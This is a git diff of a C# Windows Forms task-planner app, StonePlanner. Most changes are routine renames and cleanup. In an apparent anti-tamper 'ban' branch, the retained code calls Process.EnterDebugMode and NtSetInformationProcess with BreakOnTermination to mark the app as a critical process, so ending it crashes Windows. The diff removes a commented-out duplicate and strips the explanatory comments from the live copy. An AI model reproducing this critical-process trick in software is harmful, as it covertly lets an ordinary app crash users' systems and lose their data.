@@ -10,7 +10,6 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-using static StonePlanner.Develop;
 using static StonePlanner.Develop.Sign;
 using static StonePlanner.Exceptions;
 using static StonePlanner.Structs;
@@ -382,6 +381,7 @@ namespace StonePlanner
             Main.odcConnection.Close();
             Environment.Exit(0);
         }
+
         /// <summary>
         /// 该函数用于主窗口加载，其基本用途如下：
         /// 1、加载设置项；
@@ -459,7 +459,7 @@ namespace StonePlanner
                     Intro = recy_bin.dataGridView1.Rows[i].Cells[2].Value.ToString(),
                     Seconds = Convert.ToInt32(recy_bin.dataGridView1.Rows[i].Cells[5].Value),
                     Difficulty = Convert.ToDouble(recy_bin.dataGridView1.Rows[i].Cells[4].Value),
-                    UDID = Convert.ToInt32(recy_bin.dataGridView1.Rows[i].Cells[0].Value),
+                    ID = Convert.ToInt32(recy_bin.dataGridView1.Rows[i].Cells[0].Value),
                     Lasting = Convert.ToInt32(recy_bin.dataGridView1.Rows[i].Cells[6].Value),
                     Explosive = Convert.ToInt32(recy_bin.dataGridView1.Rows[i].Cells[7].Value),
                     Wisdom = Convert.ToInt32(recy_bin.dataGridView1.Rows[i].Cells[8].Value),
@@ -608,7 +608,7 @@ namespace StonePlanner
                         Intro = sResult[2].ToString(),
                         Seconds = Convert.ToInt32(sResult[5]),
                         Difficulty = Convert.ToInt64(sResult[4]),
-                        UDID = Convert.ToInt32(sResult[0]),
+                        ID = Convert.ToInt32(sResult[0]),
                         Lasting = Convert.ToInt32(sResult[6]),
                         Explosive = Convert.ToInt32(sResult[7]),
                         Wisdom = Convert.ToInt32(sResult[8]),
@@ -770,12 +770,6 @@ namespace StonePlanner
                 SQLConnect.SQLCommandExecution("INSERT INTO Users(UserName) Values('METHODBOX_BAN')", ref Main.odcConnection);
                 //反手关闭各线程
                 label_Sentence.Text = "A Fetal Error Occured";
-                //int isCritical = 1;  // we want this to be a Critical Process
-                //int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
-                //Process.EnterDebugMode();  //acquire Debug Privileges
-                //// setting the BreakOnTermination = 1 for the current process
-                //NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
-                ////for (int i = 0; ; i++) { System.Console.WriteLine(i); }
             }
             try
             {
@@ -785,8 +779,8 @@ namespace StonePlanner
                 {
                     Ban ban = new Ban();
                     Opacity = 0;
-                    int isCritical = 1;  // we want this to be a Critical Process
-                    int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
+                    int isCritical = 1; 
+                    int BreakOnTermination = 0x1D; 
                     Process.EnterDebugMode();  //acquire Debug Privileges
                                                // setting the BreakOnTermination = 1 for the current process
                     NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
